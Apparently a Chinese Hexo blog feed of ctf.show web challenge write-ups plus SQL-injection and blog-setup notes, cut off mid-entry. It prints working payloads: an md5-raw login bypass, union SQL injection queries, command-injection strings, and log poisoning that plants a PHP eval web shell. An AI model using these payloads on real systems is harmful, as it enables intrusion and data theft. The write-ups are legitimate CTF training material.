    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><blockquote><p> 登录界面，想到了sql注入，试一下万能密码，不行</p></blockquote></blockquote><p>`猜测可能有其他页面</p><p>法一：</p><blockquote><p><strong>直接后台目录扫描，发现index.phps源代码文件</strong></p></blockquote><p>法二：</p><blockquote><p>robots.txt中查看被隐藏不允许访问的页面</p><pre class="line-numbers language-none"><code class="language-none">User-agent: *Disallow: &#x2F;index.phps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h2 id="index-phps代码"><a href="#index-phps代码" class="headerlink" title="index.phps代码"></a>index.phps代码</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username ='admin' and password ='"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关键代码解释："><a href="#关键代码解释：" class="headerlink" title="关键代码解释："></a>关键代码解释：</h2><blockquote><ol><li><p>  PHP strlen() 函数：函数返回字符串 “Shanghai” 的长度；</p></li><li><p>mysqli_query() 函数执行某个针对数据库的查询&lt;查询成功将返回一个 mysqli_result 对象或 TRUE。如果失败，则返回 FALSE&gt;</p></li><li><p>md5() 函数计算字符串的 MD5 散列—–&gt; <center><u>md5(<em>string,raw</em>)<u/><center/></p></li><li><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要计算的字符串。</td></tr><tr><td align="left"><em>raw</em></td><td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td></tr></tbody></table></li><li><p>PHP mysqli_num_rows()：获取查询结果的行数</p></li><li><p>mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组<br> ==得出结论：==<br> 要得到flag需要向password传参，并且传参结果需要经过md5加密后通过sql语句验证，也就是可以理解为使用md5进行绕过</p></li></ol></blockquote><h1 id="php-md5-漏洞"><a href="#php-md5-漏洞" class="headerlink" title="php md5()漏洞"></a>php md5()漏洞</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"> 这里涉及到了一个<span class="token constant">PHP</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span>漏洞即：php中的md5函数有一个可选参数，如果开发者写查询数据库函数时使用了这个参数，或者在数据存储时是md5后的字符串形式存储，都有可能产生这个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><pre class="line-numbers language-none"><code class="language-none">md5(string,raw)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要计算的字符串。</td></tr><tr><td align="left"><em>raw</em></td><td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td></tr></tbody></table></blockquote><p>md5看似是非常强<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>措施，但是一旦没有返回我们常见的16进制数，返回了二进制原始输出格式，在浏览器编码的作用下就会编码成为奇怪的字符串（对于二进制一般都会编码）。</p><p>我们使用md5碰撞，一旦在这些奇怪的<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>中碰撞出了可以进行SQL注入的特殊字符串，那么就可以越过登录了</p><p>在经过长时间的碰撞后，比较常用的是以下两种：<br>数字型：<code>129581926211651571912466741651878684928</code><br>字符型：<code>ffifdyop</code></p><blockquote><p>可以使用以下代码验证：</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'ffifdyop'</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'129581926211651571912466741651878684928'</span><span class="token punctuation">;</span>    <span class="token variable">$bb</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$bb</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token variable">$cc</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$cc</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or'</span><span class="token number">6</span>�<span class="token punctuation">]</span>��<span class="token operator">!</span>r<span class="token punctuation">,</span>��b�<span class="token constant">T0D</span>��o<span class="token comment">#��'or'8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到，它们都有==<strong>‘or’</strong>==结构<br>就可以构造出**<u>必真</u>**的结果。</p><h1 id="最终结果："><a href="#最终结果：" class="headerlink" title="最终结果："></a>最终结果：</h1><p><code>strlen($password)&gt;10</code>要求字符串长度小于10，因此选择<code>ffifdyop</code></p><p>使用bp进行抓包改包，向password传参</p><p>得到flag</p><p><a href="%5B(68%E6%9D%A1%E6%B6%88%E6%81%AF">总结ctf中 MD5 绕过的一些思路</a> 总结ctf中 MD5 绕过的一些思路_yจุ๊บng的博客-CSDN博客_ctf md5绕过](<a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a>))</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow_web_萌新赛签到题</title>
    <link href="https://kannikanyun.github.io/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/"/>
    <id>https://kannikanyun.github.io/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/</id>
    <published>2022-04-14T11:52:23.000Z</published>
    <updated>2022-04-14T14:17:32.128Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl https://"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".ctf.show"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看得出关键处是==system()==中的内容，此处去了解下</p><h1 id="PHP-命令执行漏洞"><a href="#PHP-命令执行漏洞" class="headerlink" title="PHP 命令执行漏洞"></a>PHP 命令执行漏洞</h1><blockquote><p>应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。</p><p>当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞，这就是命令执行漏洞。</p></blockquote><p><a href="%5B(68%E6%9D%A1%E6%B6%88%E6%81%AF">PHP的命令执行漏洞学习</a> PHP的命令执行漏洞学习_笑花大王的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_43818995/article/details/104164684))%EF%BC%9A%EF%BC%88win%E4%B8%8Elinux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%AE%A1%E9%81%93%E7%AC%A6%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%89">https://blog.csdn.net/weixin_43818995/article/details/104164684))：（win与linux系统下管道符的功能）</a></p><p>[ctfweb命令执行](<a href="https://www.cnblogs.com/NPFS/p/13797436.html">CTFshow web入门 (命令执行） - NPFS - 博客园 (cnblogs.com)</a>)</p><blockquote><p>system解释：</p><p>php函数system详解： 执行外部程序并显示输出资料。 system语法: string system(string command, int [return_var]); system返回值: 字符串 函数种类: 操作系统与环境 system内容说明 本函数就像是 C 语中的函数 system()，用来执行指令，并输出结果。</p></blockquote><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p><strong>有两种方式</strong>（linux下url命令传参）</p><p>一：</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;127.0.0.1;cat flag;该命令直接猜测查看flag文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>二：</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;ff5cc03e-74f6-4b21-aedd-b7365f36e520;ls;该命令显示结果为：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>flag index.php </p></blockquote><p>继续访问flag文件</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;ff5cc03e-74f6-4b21-aedd-b7365f36e520;cat flag;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>ctfShow7_8</title>
    <link href="https://kannikanyun.github.io/2022/04/08/ctfShow-web-7-8/"/>
    <id>https://kannikanyun.github.io/2022/04/08/ctfShow-web-7-8/</id>
    <published>2022-04-08T09:04:17.000Z</published>
    <updated>2022-04-08T09:30:24.735Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctf-show-web7"><a href="#ctf-show-web7" class="headerlink" title="ctf.show_web7"></a>ctf.show_web7</h1><blockquote><p>点开题目中列表，没有发现有价值的信息</p><p>但是URL中出现了**<u>?id=</u>**字样，可能是sql注入</p></blockquote><p><code>http://579975c2-c8b2-48a7-955a-efc4b38455a6.challenge.ctf.show/?id=1</code></p><h2 id="简单判断有无注入点"><a href="#简单判断有无注入点" class="headerlink" title="简单判断有无注入点"></a>简单判断有无注入点</h2><p><code>id=1&#39;</code> 单引号判断（可能因为单引号不匹配而报错）</p><blockquote><p>/index.php?id=1’ #</p><p>不报错</p></blockquote><h2 id="尝试后发现-空格-被过滤"><a href="#尝试后发现-空格-被过滤" class="headerlink" title="尝试后发现==空格==被过滤"></a>尝试后发现==空格==被过滤</h2><p>使用==//==或==/**/==绕过过滤</p><table><thead><tr><th align="left">爆显示位</th><th>?id=1%27/<strong>/or/</strong>/1=1/<strong>/union/</strong>/select/**/1,2,3#</th></tr></thead><tbody><tr><td align="left">爆表</td><td>？id=1/<strong>/union/</strong>/select/<strong>/1,group_concat(table_name),3/</strong>/from/<strong>/information_schema.tables/</strong>/where/**/table_schema=database()#</td></tr><tr><td align="left">爆字段</td><td>?id=-1/<strong>/union/</strong>/select/<strong>/1,group_concat(column_name),3/</strong>/from/<strong>/information_schema.columns/</strong>/where/**/table_name=”flag”#</td></tr><tr><td align="left">爆值</td><td>?id=-1/<strong>/union/</strong>/select/<strong>/1,flag,3/</strong>/from/**/flag#</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>sql注入点判断</title>
    <link href="https://kannikanyun.github.io/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/"/>
    <id>https://kannikanyun.github.io/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/</id>
    <published>2022-04-05T08:01:55.000Z</published>
    <updated>2022-04-21T12:40:24.920Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简单判断是否存在SQL注入"><a href="#简单判断是否存在SQL注入" class="headerlink" title="简单判断是否存在SQL注入"></a>简单判断是否存在SQL注入</h1><h2 id="单引号判断"><a href="#单引号判断" class="headerlink" title="单引号判断"></a><strong>单引号判断</strong></h2><p><strong>$id参数左右有数字型（无）、单引号、双引号、括号等方式组成闭合；</strong></p><p>最为经典的==单引号判断法：==在参数后面加上单引号’比如:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">　http:<span class="token comment">//xxx/abc.php?id=1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　如果页面返回错误，则存在 Sql 注入。 原因是无论字符型还是整型都会因为</p><blockquote><p><strong>单引号个数不匹配</strong></p></blockquote><p>而报错。</p><h2 id="万能语句："><a href="#万能语句：" class="headerlink" title="万能语句："></a>万能语句：</h2><p>如果我们传入的 username 为 1’ or 1=1 #，随意输入 password，那么传入后端验证时，sql语句就是</p><blockquote><p><strong><strong>*%23为#注释符的url编码*</strong></strong></p></blockquote><pre><code>select * from table_name where username=&#39;1&#39; or 1=1 # &#39; and password=&#39;xxxxxx&#39;</code></pre><h1 id="通常-Sql-注入漏洞分为-2-种类型："><a href="#通常-Sql-注入漏洞分为-2-种类型：" class="headerlink" title="通常 Sql 注入漏洞分为 2 种类型："></a>通常 <u>Sql</u> 注入漏洞分为 2 种类型：</h1><blockquote><p>　　<strong>数字型</strong></p><p>　　<strong>字符型</strong></p></blockquote><h2 id="数字型判断："><a href="#数字型判断：" class="headerlink" title="数字型判断："></a>数字型判断：</h2><p>　　当输入的参 x 为整型时，通常 123.php 中 Sql 语句类型大致如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">select <span class="token operator">*</span> from <span class="token operator">&lt;</span>表名<span class="token operator">></span> where id <span class="token operator">=</span> x     这种类型可以使用经典的 <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> 和 <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> 来判断：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>　　Url 地址中输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x <strong>and 1=1</strong> 页面依旧运行正常，继续进行下一步。(说明sql语句执行了，语句语法及逻辑判断正确，因此不报错)</p></blockquote><p>　　Url 地址中<u><strong>继续</strong></u>输入 </p><p><code>http://xxx/abc.php?id= x **and 1=2**</code> </p><p>页面运行错误，则说明此 Sql 注入为数字型注入。</p><h3 id="语句解释"><a href="#语句解释" class="headerlink" title="语句解释"></a>语句解释</h3><p>当输入 and 1=1时，后台执行 Sql 语句：</p><p>　　<code>select * from &lt;表名&gt; where id = x and 1=1</code></p><p>　　当输入 and 1=2时，后台执行 Sql 语句：</p><p>　　select * from &lt;表名&gt; where id = x and 1=2</p><p>　　没有语法错误但是逻辑判断为假，所以返回错误。 </p><p>我们再使用==假设法：==如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：</p><p>　　<code>select * from &lt;表名&gt; where id = &#39;x **and 1=1**&#39; select * from &lt;表名&gt; where id = &#39;x **and 1=2**&#39;</code></p><p>　　查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p><h2 id="字符型判断："><a href="#字符型判断：" class="headerlink" title="字符型判断："></a>字符型判断：</h2><p>　　当输入的参 x 为字符型时，通常 123.php 中 SQL 语句类型大致如下： select * from &lt;表名&gt; where id = <strong>‘x’</strong> 这种类型我们同样可以使用 <strong>and ‘1’=’1</strong> 和 <strong>and ‘1’=’2</strong>来判断：</p><p>　　<code>Url 地址中输入 http://xxx/abc.php?id= x**&#39; and &#39;1&#39;=&#39;1**</code> </p><p>页面运行正常，继续进行下一步。</p><p>　　<code>Url 地址中继续输入 http://xxx/abc.php?id= x**&#39; and &#39;1&#39;=&#39;2**</code> </p><p>页面运行错误，则说明此 Sql 注入为字符型注入。</p><h3 id="语句解释-1"><a href="#语句解释-1" class="headerlink" title="语句解释"></a>语句解释</h3><blockquote><p>‘ 的作用是使语句闭合，否则整个语句将被当作字符串处理</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="SQL" scheme="https://kannikanyun.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-blog搭建问题汇总</title>
    <link href="https://kannikanyun.github.io/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <id>https://kannikanyun.github.io/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</id>
    <published>2022-04-03T11:15:38.000Z</published>
    <updated>2022-06-17T05:29:46.618Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-hexo-d命令时提示输入账号和密码"><a href="#1-hexo-d命令时提示输入账号和密码" class="headerlink" title="1.hexo d命令时提示输入账号和密码"></a>1.hexo d命令时提示输入账号和密码</h1><p>问题起源来自一次hexo d的命令部署失败（从blog搭建开始那天，只要选择远端部署，报错就没消停过）<br>hexo d后一直报错，提示无法连接github，于是修改了ssh，重新配置了_config.yml中的deploy：repo: <a href="https://github.com/KanNiKanYun/KanNiKanYun.github.io">https://github.com/KanNiKanYun/KanNiKanYun.github.io</a><br>但是依旧没能解决问题：无法部署远端</p><h2 id="于是继续查询解决方案"><a href="#于是继续查询解决方案" class="headerlink" title="于是继续查询解决方案 "></a><strong>于是继续查询解决方案</strong> </h2><p><a href="https://blog.csdn.net/hhgggggg/article/details/77853665">https://blog.csdn.net/hhgggggg/article/details/77853665</a><br>解决参考链接如上<br>关键步骤：<br>配置rope为repo: <a href="mailto:&#x67;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;">&#x67;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;</a>:<strong><u>kannikanyun/kannikanyun</u></strong>.github.io.git</p><h2 id="gitee图床失效后的新的选择方式"><a href="#gitee图床失效后的新的选择方式" class="headerlink" title="gitee图床失效后的新的选择方式"></a>gitee图床失效后的新的选择方式</h2><p><a href="https://blog.csdn.net/rong09_13/article/details/123885104?ops_request_misc=%7B%22request_id%22:%22164897506216780255258485%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164897506216780255258485&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123885104.142%5Ev5%5Epc_search_insert_es_download,157%5Ev4%5Enew_style&utm_term=gitee%E5%9B%BE%E5%BA%8A%E4%B8%8D%E8%83%BD&spm=1018.2226.3001.4187">具体参考配置</a></p><p>概括：使用github仓库作为图床</p><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><p>1.上传速度慢</p><p>2.需要一段时间后更换仓库，以免占用空间过大被检测</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="BLOG" scheme="https://kannikanyun.github.io/tags/BLOG/"/>
    
  </entry>
  
  <entry>
    <title>ctfShow-web-4-6</title>
    <link href="https://kannikanyun.github.io/2022/04/01/ctfShow-web-4-6/"/>
    <id>https://kannikanyun.github.io/2022/04/01/ctfShow-web-4-6/</id>
    <published>2022-04-01T11:17:03.000Z</published>
    <updated>2022-04-03T12:51:40.187Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="4-ctf-show-web4"><a href="#4-ctf-show-web4" class="headerlink" title="4.ctf.show_web4"></a>4.ctf.show_web4</h1><p>题目描述和web3是一样的，但是3的方法已经不行了，没有思路，看提示</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051792.png"></p><pre class="line-numbers language-html" data-language="html"><code class="language-html">/etc/passwd依旧可以访问<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">文件包含  日志注入<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><u>请求头中可以看出，服务器是<strong>nginx</strong></u></p><p>nginx的log在</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>access.log允许打开</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">http:&#x2F;&#x2F;6339ac54-c058-4ed2-a21d-5fe884f66c63.challenge.ctf.show&#x2F;?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051635.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">在UA中添加<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>防止url编码</p><p>使用蚁剑成功连接</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051517.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051563.png"></p><p><a href="%5B(66%E6%9D%A1%E6%B6%88%E6%81%AF">refer to</a> CTF show WEB 1-4_yu22x的博客-CSDN博客_ctfshow web](<a href="https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11">https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11</a>))</p><h1 id="5-ctf-show-web5"><a href="#5-ctf-show-web5" class="headerlink" title="5.ctf.show_web5"></a>5.ctf.show_web5</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"v1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string 